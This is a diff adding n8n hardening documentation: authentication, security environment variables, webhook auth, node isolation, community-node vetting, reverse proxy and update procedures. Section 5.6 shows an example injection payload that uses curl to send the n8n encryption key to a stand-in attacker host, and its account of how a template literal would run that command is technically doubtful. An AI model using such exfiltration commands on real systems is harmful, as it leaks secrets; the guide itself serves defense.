@@ -2140,39 +2140,554 @@ docker inspect $(docker compose ps -q n8n) --format '{{.HostConfig.NetworkMode}}
 
 ### 5.1 Binding and Authentication
 
-<!-- Content: T024 -->
+**Threat**: Unauthenticated n8n instance accessible from the network allows anyone to create workflows, extract credentials, and achieve remote code execution
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [n8n Security Documentation](https://docs.n8n.io/hosting/configuration/environment-variables/security/)
+
+#### Why This Matters
+
+n8n provides a web UI and REST API that can create, modify, and execute workflows — including Code and Execute Command nodes. An unauthenticated n8n instance on the network is equivalent to giving every LAN device a shell on your server.
+
+#### How to Harden
+
+**Bind n8n to localhost only:**
+
+```bash
+# Environment variable (set in docker-compose.yml or shell profile)
+N8N_HOST=localhost
+N8N_PORT=5678
+```
+
+- **Containerized**: The reference `docker-compose.yml` (§4.3) maps `127.0.0.1:5678:5678` — n8n is already localhost-only.
+- **Bare-metal**: Set `N8N_HOST=localhost` in the launchd plist or shell profile.
+
+**Enable authentication:**
+
+n8n v2.0+ uses built-in user management (replaces basic auth). On first launch, n8n prompts for owner account creation.
+
+```bash
+# Ensure user management is active (default in v2.0+)
+# Set a strong, unique password for the owner account during initial setup
+```
+
+**Enable TOTP 2FA for the owner account:**
+
+```bash
+# n8n supports native TOTP 2FA (since v1.102.0)
+N8N_MFA_ENABLED=true  # Default is true in v2.0+
+```
+
+After logging in as the owner, enable 2FA in Settings > Personal > Security. Use an authenticator app (Google Authenticator, Authy, or 1Password).
+
+> **WARNING**: Enable n8n authentication BEFORE binding n8n to a network interface. If remote access is needed before auth is configured, an attacker can take over the instance.
+
+#### Verification
+
+```bash
+# Verify n8n is bound to localhost
+# Containerized:
+docker port $(docker compose ps -q n8n) 2>/dev/null
+# Expected: 5678/tcp -> 127.0.0.1:5678
+
+# Bare-metal:
+sudo lsof -iTCP:5678 -sTCP:LISTEN -P -n 2>/dev/null
+# Expected: bound to 127.0.0.1, not 0.0.0.0
+
+# Verify authentication is required
+curl -s http://localhost:5678/rest/login 2>/dev/null | head -1
+# Expected: 401 or redirect to login page
+```
+
+#### Edge Cases and Warnings
+
+- **WebAuthn/FIDO2**: Not supported by n8n. Use TOTP only.
+- **Multi-user caveats**: n8n user management does NOT provide workflow-level isolation. All users see all workflows. Use role separation (owner vs member) but don't rely on it for credential isolation.
+- **Credential reuse**: Use a unique password for n8n — not your macOS login, SSH key passphrase, or any other service password.
+
+**Audit checks**: `CHK-N8N-BIND` (FAIL), `CHK-N8N-AUTH` (FAIL) → §5.1
 
 ### 5.2 User Management
 
-<!-- Content: T024 -->
+**Threat**: Single admin account shared among operators creates accountability gaps; compromised account has full system access
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A07 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
+
+#### Why This Matters
+
+The n8n owner account has full access to workflow creation, credential management, user management, and the REST API. If shared among multiple operators, there is no audit trail for who made which changes.
+
+#### How to Harden
+
+- **Owner account**: Limit to one person — the primary operator responsible for security. Use a strong, unique password with TOTP 2FA enabled.
+- **Member accounts**: Create member accounts for additional users with minimal permissions. Members can view and execute workflows but have limited administrative access.
+- **API key separation**: If the REST API is enabled, each user should have their own API key — never share API keys.
+
+#### Edge Cases and Warnings
+
+- **No workflow-level isolation**: All users can see all workflows and credentials by default. n8n does not support per-workflow access control. If strict isolation is needed, run separate n8n instances.
 
 ### 5.3 Security Environment Variables
 
-<!-- Content: T024 -->
+**Threat**: Default n8n configuration enables telemetry, allows Code nodes to read environment variables, and leaves the REST API accessible — each expanding attack surface
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [n8n Environment Variables](https://docs.n8n.io/hosting/configuration/environment-variables/)
+
+#### Why This Matters
+
+n8n's security-relevant settings are scattered across multiple documentation pages. Missing a single critical variable — like leaving `N8N_BLOCK_ENV_ACCESS_IN_NODE` unset on v1.x — can expose the master encryption key to any Code node. This section consolidates all security variables in one reference.
+
+#### How to Harden
+
+Set these environment variables in your deployment configuration (`docker-compose.yml` for containerized, launchd plist for bare-metal):
+
+**Critical security variables:**
+
+| Variable | Recommended Value | Risk if Default | Notes |
+|----------|-------------------|-----------------|-------|
+| `N8N_ENCRYPTION_KEY` | Random 64-char hex | Credentials stored unencrypted | Generate: `openssl rand -hex 32` |
+| `N8N_BLOCK_ENV_ACCESS_IN_NODE` | `true` | Code nodes can read `N8N_ENCRYPTION_KEY` | Default `true` in v2.0, `false` in v1.x — verify |
+| `N8N_RESTRICT_FILE_ACCESS_TO` | `/home/node/.n8n` | Code nodes access entire filesystem | Containerized: container limits this; bare-metal: critical |
+| `N8N_PUBLIC_API_DISABLED` | `true` | REST API allows workflow creation/credential access | Set to `true` unless API is needed |
+| `N8N_MFA_ENABLED` | `true` | No 2FA protection on accounts | Default `true` in v2.0+ |
+| `N8N_USER_MANAGEMENT_JWT_SECRET` | Random 64-char hex | Weak JWT signing | Generate: `openssl rand -hex 32` |
+
+**Telemetry and information leakage:**
+
+| Variable | Recommended Value | What It Leaks |
+|----------|-------------------|---------------|
+| `N8N_DIAGNOSTICS_ENABLED` | `false` | Deployment details, workflow counts, node usage |
+| `N8N_TEMPLATES_ENABLED` | `false` | Outbound requests to n8n servers |
+| `N8N_VERSION_NOTIFICATIONS_ENABLED` | `false` | Version check requests to n8n servers |
+| `N8N_HIRING_BANNER_ENABLED` | `false` | Minor UI noise reduction |
+| `N8N_PERSONALIZATION_ENABLED` | `false` | Usage data collection |
+
+**Logging and execution data:**
+
+| Variable | Recommended Value | Security Impact |
+|----------|-------------------|----------------|
+| `N8N_LOG_LEVEL` | `info` or `warn` | `debug` may include secrets in logs |
+| `EXECUTIONS_DATA_SAVE_ON_ERROR` | `all` | Needed for forensic review |
+| `EXECUTIONS_DATA_SAVE_ON_SUCCESS` | `none` or `all` | `all` retains PII in execution logs |
+
+**Node type restrictions:**
+
+```bash
+# Block dangerous node types (v2.0 blocks ExecuteCommand by default)
+NODES_EXCLUDE='["n8n-nodes-base.executeCommand","n8n-nodes-base.ssh","n8n-nodes-base.localFileTrigger"]'
+```
+
+> **NOTE**: `EXECUTIONS_PROCESS` was removed in n8n v2.0. Setting it causes a startup failure. Do not include it.
+
+See Appendix A for the complete reference table.
+
+#### Verification
+
+```bash
+# Containerized: check environment inside container
+docker compose exec n8n env | grep -E 'N8N_BLOCK|N8N_DIAGNOSTICS|N8N_PUBLIC_API' 2>/dev/null
+
+# Bare-metal: check n8n process environment
+ps -p $(pgrep -f "n8n start") -o pid=,command= 2>/dev/null
+```
+
+**Audit checks**: `CHK-N8N-ENV-BLOCK` (WARN), `CHK-N8N-ENV-DIAGNOSTICS` (WARN), `CHK-N8N-ENV-API` (WARN) → §5.3
 
 ### 5.4 REST API Security
 
-<!-- Content: T024 -->
+**Threat**: Attacker with API access creates malicious workflows for persistent code execution, extracts stored credentials, or modifies existing workflows
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [MITRE ATT&CK T1106 — Native API](https://attack.mitre.org/techniques/T1106/)
+
+#### Why This Matters
+
+The n8n REST API can create, modify, delete, and execute workflows, plus read and write stored credentials. An attacker who reaches the API can achieve persistent arbitrary code execution by creating a workflow with a Code or Execute Command node — and this workflow survives reboots.
+
+#### How to Harden
+
+**Preferred: Disable the API entirely:**
+
+```bash
+N8N_PUBLIC_API_DISABLED=true
+```
+
+**If the API is needed:**
+
+- Require API key authentication (configured in n8n Settings > API)
+- Store API keys as credentials (Docker secrets or Keychain — never in plaintext config files)
+- Rotate API keys on the same schedule as other credentials (§7.2)
+- Monitor for unexpected workflow changes via n8n's execution log
+- Consider rate limiting via reverse proxy (§5.8)
+
+The API shares the same port and binding as the web UI. Localhost binding (§5.1) protects it from network access, but any process on the Mac Mini that can reach localhost:5678 can call the API.
+
+#### Verification
+
+```bash
+# Verify API is disabled
+curl -s http://localhost:5678/api/v1/workflows -H "Accept: application/json" 2>/dev/null
+# Expected: 404 or 401 (not a list of workflows)
+```
+
+**Audit check**: `CHK-N8N-API` (WARN) → §5.4
 
 ### 5.5 Webhook Security
 
-<!-- Content: T024 -->
+**Threat**: Unauthenticated webhook endpoints allow attackers to trigger workflows, inject malicious payloads, or abuse webhooks for denial of service
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
+
+#### Why This Matters
+
+Every n8n Webhook node creates an HTTP endpoint. If webhooks receive Apify completion callbacks from the internet, they are direct entry points for attackers. An unauthenticated webhook that triggers a workflow processing scraped data can be used to inject malicious payloads.
+
+#### How to Harden
+
+**Configure webhook authentication (all webhook nodes):**
+
+n8n supports four authentication methods:
+
+| Method | Security | Use Case |
+|--------|----------|----------|
+| **Header Auth** (recommended) | Strong — cryptographic random secret in header | General webhook ingress |
+| **JWT Auth** | Strongest — signed token validation | Environments with JWT infrastructure |
+| **Basic Auth** | Moderate — username/password | Simple integrations |
+| **None** | **Dangerous** — open to anyone | Never use in production |
+
+Set up Header Auth on each webhook node:
+
+1. In the webhook node settings, set Authentication to "Header Auth"
+2. Generate a secret: `openssl rand -hex 32`
+3. Configure the header name (e.g., `X-Webhook-Secret`) and value
+4. Ensure the calling service (Apify) includes this header in webhook requests
+
+**Use production webhook URLs (not test URLs):**
+
+n8n test webhook URLs use predictable paths based on workflow ID and node name. Production webhook URLs use random paths. Always activate workflows and use production URLs for external integrations.
+
+**Apify webhook configuration:**
+
+Apify does NOT support HMAC webhook signing. Instead:
+
+1. Add a secret token to the webhook URL: `https://your-server/webhook/path?token=SECRET`
+2. Combine with n8n webhook Header Auth
+3. Optionally validate the `X-Apify-Webhook-Dispatch-Id` header against Apify's API
+4. Consider IP allowlisting if Apify publishes source IP ranges
+
+**Webhook payload validation:**
+
+Every webhook-triggered workflow MUST validate the incoming payload structure before processing:
+
+- Check expected fields exist
+- Validate data types and length limits
+- Reject payloads that don't match the expected schema
+- Cross-reference §5.6 for injection defense when webhook data reaches code execution nodes
+
+**Rate limiting:**
+
+If webhooks are internet-facing, implement rate limiting via the reverse proxy (§5.8) to prevent abuse.
+
+#### Verification
+
+```bash
+# Check webhook access logs (if reverse proxy is configured)
+# Monitor for high-volume requests, unexpected source IPs, or unusual payloads
+```
+
+**Audit check**: `CHK-N8N-WEBHOOK` (WARN) → §5.5
 
 ### 5.6 Execution Model and Node Isolation
 
-<!-- Content: T024 -->
+**Threat**: Scraped LinkedIn data containing shell metacharacters or prompt injection payloads reaches a Code or Execute Command node, achieving remote code execution inside n8n
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A03 Injection](https://owasp.org/Top10/A03_2021-Injection/), [OWASP LLM Top 10 — LLM01 Prompt Injection](https://owasp.org/www-project-top-10-for-large-language-model-applications/), [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
+
+#### Why This Matters
+
+n8n Code nodes execute JavaScript in the same Node.js process as n8n itself — there is NO sandbox. A Code node can access `process.env` (including `N8N_ENCRYPTION_KEY`), `require()` any module, make network requests, and read/write the filesystem. If scraped LinkedIn data reaches a Code node via string interpolation, it is remote code execution.
+
+**Concrete attack chain:**
+
+1. Attacker edits their LinkedIn job title to: `` `; curl attacker.com/exfil?key=$(cat /run/secrets/n8n_encryption_key)` ``
+2. Apify scrapes the profile and returns the malicious job title
+3. n8n workflow processes the data with a Code node: `` const result = `Processing ${item.jobTitle}` ``
+4. The backtick-interpolated string executes the attacker's shell command
+
+#### How to Harden
+
+**Set critical environment variables:**
+
+```bash
+# Prevent Code nodes from reading environment variables (blocks N8N_ENCRYPTION_KEY leakage)
+N8N_BLOCK_ENV_ACCESS_IN_NODE=true  # Default true in v2.0, verify for v1.x
+
+# Restrict filesystem access from Code nodes
+N8N_RESTRICT_FILE_ACCESS_TO=/home/node/.n8n  # Containerized
+N8N_RESTRICT_FILE_ACCESS_TO=/path/to/n8n/data  # Bare-metal
+```
+
+**Block dangerous node types:**
+
+```bash
+# Disable Execute Command, SSH, and local file trigger nodes
+NODES_EXCLUDE='["n8n-nodes-base.executeCommand","n8n-nodes-base.ssh","n8n-nodes-base.localFileTrigger"]'
+```
+
+n8n v2.0 blocks `executeCommand` and `localFileTrigger` by default. Verify:
+
+```bash
+docker compose exec n8n env | grep NODES_EXCLUDE 2>/dev/null
+```
+
+**Audit workflows processing scraped data:**
+
+Review each workflow for nodes that can execute code:
+
+| Node Type | Risk | Recommendation |
+|-----------|------|----------------|
+| **Code** | JavaScript execution | Never interpolate scraped data into code strings |
+| **Execute Command** | Shell execution | Block via `NODES_EXCLUDE` |
+| **SSH** | Remote shell | Block via `NODES_EXCLUDE` |
+| **HTTP Request** | SSRF vector | Use allowlisted base URLs only (§7.5) |
+| **AI Agent / LangChain** | Prompt injection | Structural separation of data and prompts |
+| **Function** (legacy) | JavaScript execution | Migrate to Code node with same precautions |
+
+**Safe patterns for scraped data:**
+
+- Use Set/IF/Switch/Merge nodes for transformations (these don't execute code)
+- In Code nodes, treat all scraped fields as data, never code: `JSON.stringify(item.jobTitle)` instead of template literals
+- Validate data types and lengths before processing
+- Never chain LLM output to code execution nodes
+
+**Containerized advantage:** If injection succeeds, the attacker gets a container shell — not a host shell. The blast radius is limited to the container's filesystem and network access (§4).
+
+**Bare-metal warning:** Without containerization, successful injection gives the attacker full access to the operator's home directory, SSH keys, macOS Keychain, and the ability to install persistent backdoors. Containerization is the single most important control for deployments processing scraped web data.
+
+#### Verification
+
+```bash
+# Verify N8N_BLOCK_ENV_ACCESS_IN_NODE is set
+docker compose exec n8n env 2>/dev/null | grep N8N_BLOCK_ENV_ACCESS_IN_NODE
+# Expected: N8N_BLOCK_ENV_ACCESS_IN_NODE=true
+
+# Review execution logs for injection indicators
+# Look for: unexpected outbound connections, unusual commands, file access outside expected paths
+```
+
+**Audit checks**: `CHK-N8N-NODES` (WARN), `CHK-N8N-ENV-BLOCK` (WARN) → §5.6
 
 ### 5.7 Community Node Vetting
 
-<!-- Content: T024 -->
+**Threat**: Malicious or compromised npm package executes arbitrary code within the n8n process, accessing all credentials, environment variables, and filesystem
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A08 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/), [MITRE ATT&CK T1195.001 — Compromise Software Dependencies](https://attack.mitre.org/techniques/T1195/001/)
+
+#### Why This Matters
+
+Community nodes are npm packages that execute arbitrary code within the n8n process. They have full access to n8n's environment, credentials, and filesystem. A malicious or compromised community node can silently exfiltrate all stored credentials.
+
+#### How to Harden
+
+**Vetting checklist** — complete before installing any community node:
+
+1. **Source repository**: Check npm page for a public source repo (GitHub/GitLab). No source = do not install.
+2. **Maintainer reputation**: Check publisher's npm profile for other packages and publication history. New account with one package = high risk.
+3. **Download volume**: Check weekly downloads. Under 100/week = minimal community vetting.
+4. **Version history**: Check for suspicious version churn (sudden update after long inactivity = possible account takeover).
+5. **Dependency audit**: Run `npm audit` before installation. Check for known vulnerabilities in the dependency tree.
+6. **Code review** (for high-risk nodes): Look for:
+   - Obfuscated code or minified bundles without source maps
+   - `eval()`, `Function()`, or dynamic `require()` calls
+   - Outbound network requests to hardcoded URLs
+   - Postinstall scripts that download or execute external code
+   - Filesystem access outside expected paths
+
+**Safe installation procedure:**
+
+```bash
+# Install with --ignore-scripts first (prevents postinstall code execution)
+npm install --ignore-scripts n8n-nodes-community-example
+
+# Review postinstall scripts
+cat node_modules/n8n-nodes-community-example/package.json | jq '.scripts'
+
+# If scripts are safe, re-install normally
+npm install n8n-nodes-community-example
+```
+
+> **NOTE**: Even a legitimate community node can be compromised later via maintainer account takeover. Vetting reduces but does not eliminate supply chain risk.
+
+#### Edge Cases and Warnings
+
+- **Automatic updates**: Do not enable automatic npm updates for community nodes. Re-vet before each update.
+- **Credential access**: Community nodes can access n8n's credential storage. Only install nodes on instances handling sensitive credentials if they've been code-reviewed.
 
 ### 5.8 Reverse Proxy
 
-<!-- Content: T024 -->
+**Threat**: n8n exposed directly to the internet without TLS encryption, rate limiting, or access control
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [OWASP A02 Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/), [NIST SP 800-123 §4](https://csrc.nist.gov/publications/detail/sp/800-123/final)
+
+#### Why This Matters
+
+n8n does not support TLS natively. Exposing n8n directly to the internet means credentials are transmitted in cleartext, and the full attack surface (UI, API, webhooks) is reachable without rate limiting or request logging.
+
+#### How to Harden
+
+**Option A — SSH tunnel (preferred for occasional remote access):**
+
+```bash
+# From your workstation — no additional software needed
+ssh -L 5678:localhost:5678 user@mac-mini-ip
+# Then open http://localhost:5678 in your browser
+```
+
+SSH tunneling provides encryption and authentication with zero additional configuration.
+
+**Option B — Caddy reverse proxy (for persistent remote access or webhook ingress):**
+
+```bash
+brew install caddy
+```
+
+Create a Caddyfile:
+
+```text
+your-domain.com {
+    # Only expose webhook paths externally
+    handle /webhook/* {
+        reverse_proxy localhost:5678
+    }
+
+    # Block API and other paths from external access
+    handle /api/* {
+        respond 403
+    }
+    handle /rest/* {
+        respond 403
+    }
+
+    # Optionally expose UI with basic auth
+    handle {
+        basicauth {
+            operator $2a$14$... # bcrypt hash
+        }
+        reverse_proxy localhost:5678
+    }
+
+    log {
+        output file /var/log/caddy/access.log
+    }
+}
+```
+
+Caddy automatically obtains and renews TLS certificates via Let's Encrypt.
+
+**Containerized reverse proxy:**
+
+For containerized deployments, add Caddy as a second container in the same Compose stack. The n8n container does NOT need to be port-mapped to the host — Caddy communicates with n8n over the internal Docker network.
+
+**nginx** (alternative to Caddy, free, widely documented):
+
+```bash
+brew install nginx
+```
+
+nginx requires manual TLS certificate management (use `certbot` for Let's Encrypt).
+
+#### Verification
+
+```bash
+# Verify n8n is NOT directly exposed to non-localhost
+sudo lsof -iTCP:5678 -sTCP:LISTEN -P -n 2>/dev/null
+# Expected: bound to 127.0.0.1, not 0.0.0.0
+
+# Verify reverse proxy is handling external traffic
+curl -I https://your-domain.com 2>/dev/null | head -5
+# Expected: HTTP/2 200 with valid TLS certificate
+```
 
 ### 5.9 Update and Migration Security
 
-<!-- Content: T024 -->
+**Threat**: n8n version upgrade silently changes security defaults, resets environment variables, or introduces new code-execution-capable node types
+**Layer**: Prevent
+**Deployment**: Both
+**Source**: [NIST SP 800-40 Rev 4](https://csrc.nist.gov/publications/detail/sp/800-40/rev-4/final)
+
+#### Why This Matters
+
+n8n version upgrades can silently change security-relevant defaults, introduce new node types, or run database migrations that alter how credentials are stored. Upgrading without verification can undo hardening work.
+
+#### How to Harden
+
+**Pre-update checklist:**
+
+1. Back up the n8n database and credentials (§9.3)
+2. Record current workflow baseline hash (§8.3)
+3. Review n8n release notes for security-relevant changes
+4. For containerized: record the current image digest
+
+```bash
+# Record current image digest before updating
+docker inspect n8nio/n8n --format '{{index .RepoDigests 0}}' 2>/dev/null
+```
+
+**Containerized update procedure:**
+
+```bash
+# Pull new image
+docker compose pull n8n
+
+# Stop and recreate (compose file security options are preserved)
+docker compose down
+docker compose up -d
+
+# Run post-update verification
+```
+
+**Bare-metal update procedure:**
+
+```bash
+# Update n8n
+npm update -g n8n
+
+# Run post-update verification
+```
+
+**Post-update verification:**
+
+1. Run the audit script: `scripts/hardening-audit.sh`
+2. Verify security env vars are still applied (§5.3)
+3. Verify disabled node types remain disabled (`NODES_EXCLUDE`)
+4. Check that credentials still decrypt correctly
+5. Verify workflow baseline has not changed unexpectedly
+
+**Rollback procedure:**
+
+```bash
+# Containerized: restore previous image
+docker compose down
+# Edit docker-compose.yml to use previous image digest
+docker compose up -d
+
+# Bare-metal: install specific version
+npm install -g n8n@<previous-version>
+
+# Restore database from pre-update backup if needed
+```
+
+#### Edge Cases and Warnings
+
+- **v2.0 breaking changes**: `EXECUTIONS_PROCESS` was removed — setting it causes startup failure. `N8N_BLOCK_ENV_ACCESS_IN_NODE` defaults changed to `true`.
+- **Database migrations**: Some upgrades modify the database schema. Ensure backups are taken before upgrading.
+- **Compose file preservation**: Never modify the compose file's security options during an update. Only change the image tag/digest.
 
 ---
 
